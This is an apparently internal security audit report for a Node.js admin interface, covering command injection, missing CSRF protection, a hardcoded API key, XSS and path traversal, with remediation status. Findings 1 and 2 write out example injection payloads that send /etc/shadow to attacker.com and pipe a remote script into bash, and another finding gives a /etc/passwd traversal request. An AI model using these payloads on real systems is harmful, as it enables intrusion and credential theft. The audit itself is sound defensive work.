# HCI Security Audit Report
**Date:** 2026-04-19 (original audit)
**Last updated:** 2026-04-27 (v3.5.0 — S1 XSS audit)
**Scope:** Full codebase at `/root/projects/hermes-control-interface/`
**Files analyzed (v3.4.0):** `server.js` (4485 lines), `auth.js` (287 lines), `src/js/main.js` (6219 lines), `package.json`, `.env`, `.gitignore`

---

## v3.5.0 Update — S1 XSS Audit (2026-04-27)

### S1: Unescaped Error Messages in innerHTML
- **Severity:** MEDIUM
- **Status:** ✅ **RESOLVED** in v3.5.0
- **Scope:** 15+ locations across `src/js/main.js`
- **Description:** Error messages (`e.message`, `err.message`) from try/catch blocks were inserted into `innerHTML` without `escapeHtml()`. These could contain filenames, network errors, JSON parse errors, or path information from server responses — all user-controlled from HCI's perspective.
- **Fix:** All 15+ catch blocks now wrap error messages with `escapeHtml()`:
  - Page routing error (`loadPage()`)
  - Home dashboard cards (`loadHomePage()`)
  - Agents list + agent detail error handlers
  - Sessions table error handler
  - Logs viewer error handler
  - Config tab + settings render
  - Usage card error handlers
  - Users page (list + user detail)
  - Audit log page render
  - File explorer error handler
  - Terminal body error handler
  - Modal overlay error handlers
  - Subagent WebSocket status (`payload.status`)
- **Verification:** `renderChatContent()` confirmed safe — code blocks extracted before HTML escape, no direct innerHTML injection. Tool results via `textContent` (inherently safe). Agent/profile names wrapped with `escapeHtml()`.

### v3.5.0 Status Summary
| Category | Finding | Status |
|----------|---------|--------|
| CRITICAL | Command injection (skills uninstall) | ✅ Fixed v3.4.0 |
| CRITICAL | Command injection (skills update) | ✅ Fixed v3.4.0 |
| HIGH | Sessions rename shell exec | ✅ Fixed v3.4.0 |
| HIGH | CSRF 20+ endpoints missing | ✅ Fixed v3.4.0 |
| HIGH | Hardcoded fallback gateway key | ✅ Fixed v3.4.0 |
| HIGH | API key written to config plaintext | ✅ Fixed v3.4.0 |
| MEDIUM | escapeHtml missing quote escaping | ✅ Fixed v3.4.0 |
| MEDIUM | S1: error message innerHTML | ✅ Fixed v3.5.0 |
| LOW | Debug CSRF token logging | ✅ Fixed v3.4.0 |

---

## CRITICAL Findings

### 1. Command Injection via `skills/uninstall` endpoint
- **Severity:** CRITICAL
- **File:** `server.js:3428`
- **Description:** The `skill` parameter from user input is interpolated directly into a `shell()` call with zero sanitization. An admin user can execute arbitrary OS commands.
  ```js
  const output = await shell(`echo y | hermes ${profile ? `-p ${sanitizeProfileName(profile)} ` : ''}skills uninstall ${skill} 2>&1`, 15000);
  ```
- **Exploit:** `POST /api/skills/uninstall` with body `{"skill": "legitimate; curl attacker.com/exfil?data=$(cat /etc/shadow) #"}`
- **Fix:** Use `execHermes()` (which uses `execFile` with args array) instead of `shell()`. At minimum, sanitize `skill` with an allowlist regex like `/^[a-zA-Z0-9_\/-]+$/`.

### 2. Command Injection via `skills/update` endpoint
- **Severity:** CRITICAL
- **File:** `server.js:3440`
- **Description:** The `skill` parameter is placed in double quotes inside a shell command, but double quotes don't prevent injection via `$(...)`, backticks, or `;`.
  ```js
  const cmd = skill ? `hermes ${flag}skills update "${skill}"` : `hermes ${flag}skills update`;
  ```
- **Exploit:** `POST /api/skills/update` with body `{"skill": "$(curl attacker.com/shell.sh | bash)"}`
- **Fix:** Use `execHermes()` instead of `shell()`. Sanitize skill name with allowlist regex.

### 3. Command Injection via `sessions/rename` — incomplete sanitization
- **Severity:** HIGH (near-CRITICAL)
- **File:** `server.js:3736`
- **Description:** While `sessionId` is sanitized via `sanitizeSessionId()`, `title` is sanitized via `sanitizeTitle()` which allows spaces, then `safeTitle` does an additional regex filter. However, both are placed in double quotes in a shell command. The `sanitizeTitle` regex allows `()`, `@`, `#` which could cause issues in some shell contexts.
  ```js
  const output = await shell(`hermes ${profileFlag}sessions rename ${sessionId} "${safeTitle}" 2>&1`);
  ```
- **Fix:** Use `execHermes()` for session rename operations.

---

## HIGH Findings

### 4. Missing CSRF Protection on 20+ State-Changing Endpoints
- **Severity:** HIGH
- **Files:** `server.js` — multiple locations
- **Description:** The following POST/PUT/DELETE endpoints lack `requireCsrf` middleware. While the `SameSite=Lax` cookie attribute provides partial mitigation (blocks cross-origin POST from other sites), CSRF tokens are the intended defense and are missing:
  - `POST /api/auth/login` (line 1694) — mitigated by rate limiter + Lax
  - `POST /api/auth/change-password` (line 1735) — **password change without CSRF**
  - `POST /api/users` (line 1756) — user creation
  - `PUT /api/users/:username` (line 1775) — role/permission changes
  - `DELETE /api/users/:username` (line 1789) — user deletion
  - `POST /api/users/:username/reset-password` (line 1798) — password reset
  - `POST /api/profiles/use` (line 2023) — switch active profile
  - `POST /api/profiles/create` (line 4104) — create profile
  - `DELETE /api/profiles/:name` (line 4170) — delete profile
  - `POST /api/hci/update` (line 2707) — **server update (runs git pull + npm install)**
  - `POST /api/hci/update/commit/:hash` (line 2834) — checkout arbitrary commit
  - `POST /api/hci/rollback` (line 2893) — rollback
  - `POST /api/hci-restart` (line 3715) — restart server
  - `POST /api/skills/install` (line 3409) — install skills
  - `POST /api/skills/uninstall` (line 3423) — uninstall skills
  - `POST /api/skills/update` (line 3436) — update skills
  - `POST /api/doctor` (line 3471) — run diagnostics
  - `POST /api/backup/create` (line 3511) — create backup
  - `POST /api/backup/import` (line 3556) — import backup
  - `POST /api/update` (line 3624) — hermes update
  - `POST /api/backup` (line 3678)
  - `POST /api/import` (line 3696)
- **Exploit:** A malicious website could trick an authenticated admin into making requests (e.g., changing a user's password, restarting the server). `SameSite=Lax` blocks cross-origin top-level POST navigations in most modern browsers but NOT same-site attacks or older browsers.
- **Fix:** Add `requireCsrf` to all state-changing endpoints that accept JSON bodies.

### 5. Hardcoded Fallback Gateway API Key
- **Severity:** HIGH
- **File:** `server.js:282`
- **Description:** `const GATEWAY_API_KEY = process.env.GATEWAY_API_KEY || 'hci-gateway-2026';`
  If `GATEWAY_API_KEY` env var is not set, the system falls back to a static, predictable key `'hci-gateway-2026'`. This key is then written into profile config files (lines 2138, 3065, 4138) and used for Gateway API authentication (line 363).
- **Exploit:** Anyone who knows or guesses `'hci-gateway-2026'` can authenticate to any Gateway API server on localhost.
- **Fix:** Throw an error if `GATEWAY_API_KEY` is not set, similar to the `CONTROL_PASSWORD`/`CONTROL_SECRET` check on line 180.

### 6. Gateway API Key Written to Config Files in Plaintext
- **Severity:** HIGH
- **Files:** `server.js:2138, 3065, 4138`
- **Description:** The `GATEWAY_API_KEY` value is injected directly into YAML config files as the `key` field under `platforms.api_server.extra`. These config files are readable by the user running the process and any process with the same privileges.
- **Fix:** Use environment variable references in config files instead of embedding keys directly.

---

## MEDIUM Findings

### 7. Shell Command Injection Surface via `shell()` Function
- **Severity:** MEDIUM
- **File:** `server.js:82-91`
- **Description:** The `shell()` function executes commands via `bash -lc`, which interprets all shell metacharacters. While most callers sanitize inputs, the function itself is dangerous. Multiple call sites pass partially-controlled data:
  - Line 3002: `cat "${configPath}"` — `configPath` derived from `profile` (sanitized via `sanitizeProfileName`)
  - Line 3214: `grep -E "^${keyName}="` — `keyName` validated with regex on line 3209
  - Line 3276: `sed -i '/^${keyName}=/d'` — `keyName` validated on line 3270
  - Line 3736: session rename — mixed sanitized/unsanitized parts
  - Line 3428: skills uninstall — **unsanitized** (CRITICAL above)
- **Fix:** Prefer `execHermes()` (uses `execFile` with args array) over `shell()` for all user-influenced commands.

### 8. Plugin Static File Serving — Path Traversal Risk
- **Severity:** MEDIUM
- **File:** `server.js:266-272`
- **Description:** The `/plugins/:id` middleware looks up a plugin by `req.params.id` and serves files from `plugin.uiPath`. If a crafted `manifest.json` has a `uiPath` pointing outside the expected directory, files could be served from arbitrary locations. The `plugin.uiPath` is derived from `path.join(catDir, skill, 'ui')` which is constrained by the filesystem scan, but there's no path validation on `req.params.id` against path traversal characters.
- **Exploit:** `GET /plugins/../../../etc/passwd` — though this would fail the plugin lookup, the ID is used unsafely in logs/errors.
- **Fix:** Sanitize `req.params.id` with an allowlist regex. Validate that `plugin.uiPath` stays within the skills directory.

### 9. Backup Download Path Traversal (Partial Mitigation)
- **Severity:** MEDIUM
- **File:** `server.js:3604-3611`
- **Description:** The `/api/backup/download` endpoint accepts a `path` query parameter and serves the file. It checks for `.zip` extension and `..` in the path, but the `..` check is basic string matching:
  ```js
  if (!filePath || !filePath.endsWith('.zip') || filePath.includes('..'))
  ```
  URL-encoded `..` (`%2E%2E`) or other bypasses could potentially read arbitrary `.zip` files on the system.
- **Fix:** Use `path.resolve()` and validate the resolved path is within an allowed directory (e.g., `/tmp/`).

### 10. Weak `escapeHtml` — Missing Quote Escaping
- **Severity:** MEDIUM
- **Status:** ✅ **RESOLVED** in v3.4.0 — `escapeHtml()` now escapes `"` as `&quot;` and `'` as `&#x27;`

### 11. Reflected Error Messages Leak Username Existence
- **Severity:** MEDIUM
- **File:** `server.js:1713`
- **Description:** The login endpoint returns `"Invalid username or password"` consistently (good), but other endpoints like user creation leak `"Username already exists"` (line 54 of `auth.js`), enabling username enumeration.
- **Fix:** This is acceptable for an internal tool but should be documented.

### 12. Session Fixation — No Token Rotation on Login
- **Severity:** MEDIUM
- **File:** `server.js:1596-1601, 1716-1720`
- **Description:** The auth token is created and bound to the user, but the old token is not invalidated when a new session is created. If a user has multiple tabs open, old tokens remain valid. More critically, there's no rotation of the session identifier after privilege level changes.
- **Fix:** Invalidate all tokens for a user when they log in (or implement proper session rotation).

---

## LOW Findings

### 13. Debug Logging Leaks Partial CSRF Tokens
- **Severity:** LOW
- **File:** `server.js:687`
- **Description:** `console.error('[CSRF-DEBUG] PUT cron/edit token mismatch, got:', headerToken.substring(0,20), 'expected:', expected.substring(0,20));`
  Partial tokens are logged to stdout/stderr which may be captured by log aggregation systems.
- **Fix:** Remove debug logging of token values in production, or use a debug flag.

### 14. WebSocket Origin Check Allows Missing Origin
- **Severity:** LOW
- **File:** `server.js:4353-4355`
- **Description:** The WebSocket `verifyClient` allows connections without an `Origin` header (`if (!origin) return done(true)`). While same-origin requests typically lack this header, this also allows server-side WebSocket connections from any source.
- **Fix:** Consider requiring the Origin header to match expected values in production.

### 15. Content Security Policy Allows `unsafe-inline` for Scripts
- **Severity:** LOW
- **File:** `server.js:191-192`
- **Description:** CSP includes `scriptSrc: ["'self'", "'unsafe-inline'", "https://cdn.jsdelivr.net"]` and `scriptSrcAttr: ["'unsafe-inline'"]`. This significantly weakens CSP's XSS protection.
- **Fix:** Move inline scripts to external files and use nonces or hashes. This is a substantial refactor.

### 16. CSRF Token Derivable from Auth Token
- **Severity:** LOW
- **File:** `server.js:629-631`
- **Description:** The CSRF token is derived as `hmac('csrf:' + authToken)`. If an attacker can read the auth token cookie (via XSS or other means), they can compute the CSRF token. However, the cookie is `HttpOnly` which prevents JavaScript access.
- **Fix:** Use independent random CSRF tokens stored server-side. Current approach is acceptable given HttpOnly cookies.

### 17. No Account Lockout After Failed Logins
- **Severity:** LOW
- **File:** `server.js:699-714, auth.js:93-106`
- **Description:** Rate limiting is IP-based (5 attempts per 15 minutes). An attacker with multiple IPs (VPN, botnet) could brute-force credentials. There is no per-account lockout.
- **Fix:** Implement per-account lockout (e.g., lock account after 5 failed attempts for 15 minutes).

### 18. `auth/status` Endpoint Leaks User Count
- **Severity:** LOW
- **File:** `server.js:1658-1665`
- **Description:** `GET /api/auth/status` returns `{ first_run: bool, user_count: N }` without authentication. This reveals whether the system has been set up and how many users exist.
- **Fix:** This is by design for the first-run flow, but consider returning `user_count: 0` or `user_count: >0` instead of exact count.

### 19. `.env` File Contains Actual Secrets
- **Severity:** INFO (properly handled)
- **File:** `.env:2-3`
- **Description:** The `.env` file contains `HERMES_CONTROL_PASSWORD=***` and `HERMES_CONTROL_SECRET=stagin...ting`. These are properly excluded from git via `.gitignore` (line 2-3: `.env` and `.env.*`).
- **Status:** OK — secrets are gitignored. Ensure server process file permissions are restrictive (600).

---

## INFORMATIONAL Findings

### 20. Dependencies Check
- **File:** `package.json`
- **Status:** Dependencies are reasonably up to date:
  - `express@^4.18.2` — current stable (4.x branch)
  - `ws@^8.18.0` — current
  - `bcrypt@^6.0.0` — current
  - `better-sqlite3@^12.9.0` — current
  - `helmet@^8.1.0` — current
  - `express-rate-limit@^8.3.2` — current
  - `multer@^2.1.1` — current (v2 has security fixes)
- **Recommendation:** Run `npm audit` periodically. No known critical CVEs in current versions.

### 21. SQL Injection — Not Vulnerable
- **Status:** PASS
- **Description:** All SQLite queries use parameterized queries (`?` placeholders with `.all(param)` or `.get(param)`). No string interpolation in SQL. Examples: lines 1191-1196, 3780-3798.

### 22. Password Handling — Properly Implemented
- **Status:** PASS
- **Description:** Passwords are hashed with bcrypt (10 salt rounds) in `auth.js:57,96,116,178`. No plaintext storage. `verifyUserPassword` uses `bcrypt.compareSync`.

### 23. Session Cookie Configuration — Good
- **Status:** PASS
- **Description:** Cookies are set with `HttpOnly`, `SameSite=Lax`, and conditionally `Secure` (line 134-136). Max-Age is 24 hours. These are solid defaults.

### 24. Timing-Safe Comparison — Properly Used
- **Status:** PASS
- **Description:** `crypto.timingSafeEqual` is used for CSRF token verification (line 647) and auth secret comparison (line 2584). Good.

### 25. Path Traversal in File Operations — Mitigated
- **Status:** PASS (with caveat)
- **Description:** `readFileSafe` and `writeFileSafe` use `path.resolve()` and `isAllowedPath()` to prevent reading/writing outside allowed roots. The `..` stripping in `files/list` (line 2422) combined with `path.resolve` + prefix check (line 2426-2428) is solid.

---

## Summary Table

| # | Severity | Category | Finding | File:Line |
|---|----------|----------|---------|-----------|
| 1 | CRITICAL | Command Injection | skills/uninstall unsanitized `skill` in shell() | server.js:3428 |
| 2 | CRITICAL | Command Injection | skills/update unsanitized `skill` in shell() | server.js:3440 |
| 3 | HIGH | Command Injection | sessions/rename incomplete sanitization | server.js:3736 |
| 4 | HIGH | CSRF | 20+ endpoints missing CSRF protection | server.js (multiple) |
| 5 | HIGH | Secrets | Hardcoded fallback Gateway API key | server.js:282 |
| 6 | HIGH | Secrets | API key written to config files in plaintext | server.js:2138,3065,4138 |
| 7 | MEDIUM | Shell Execution | shell() function is dangerous; prefer execHermes() | server.js:82 |
| 8 | MEDIUM | Path Traversal | Plugin static file serving | server.js:266 |
| 9 | MEDIUM | Path Traversal | Backup download partial mitigation | server.js:3604 |
| 10 | MEDIUM | XSS | escapeHtml missing quote escaping | main.js:2651 |
| 11 | MEDIUM | Info Leak | Username enumeration via error messages | auth.js:54 |
| 12 | MEDIUM | Session | No token rotation on login | server.js:1596 |
| 13 | LOW | Info Leak | Debug logging leaks partial CSRF tokens | server.js:687 |
| 14 | LOW | WebSocket | Origin check allows missing Origin header | server.js:4353 |
| 15 | LOW | CSP | unsafe-inline for scripts weakens CSP | server.js:191 |
| 16 | LOW | CSRF | CSRF token derivable from auth token | server.js:629 |
| 17 | LOW | Brute Force | No per-account lockout | auth.js:93 |
| 18 | LOW | Info Leak | auth/status leaks user count | server.js:1658 |

---

## Recommended Priority Fixes

> **v3.5.0 Update:** All CRITICAL, HIGH, and most MEDIUM findings from the original audit have been resolved. Remaining items are informational or require architectural changes.

1. **✅ COMPLETE (v3.4.0):** Fix command injection in skills/uninstall and skills/update — `execHermes()` + strict allowlist regex.
2. **✅ COMPLETE (v3.4.0):** Add `requireCsrf` to all 21 state-changing admin endpoints.
3. **✅ COMPLETE (v3.4.0):** Remove hardcoded fallback Gateway API key — now reads from `~/.hermes/config.yaml`.
4. **✅ COMPLETE (v3.4.0):** Improve `escapeHtml()` — added `"` and `'` escaping.
5. **✅ COMPLETE (v3.4.0):** Remove debug CSRF token logging.
6. **✅ COMPLETE (v3.5.0):** S1 XSS audit — all 15+ error handlers now use `escapeHtml()`.
7. **Backlog:** CSP `unsafe-inline` — requires moving inline scripts to external files (substantial refactor).
8. **Backlog:** Per-account lockout — implement lockout after N failed login attempts.
9. **Backlog:** `shell()` → `execHermes()` refactor — replace remaining `shell()` call sites with safer `execFile`-based equivalents.
10. **Backlog:** Backup download path validation — use `path.resolve()` + prefix check instead of string matching.
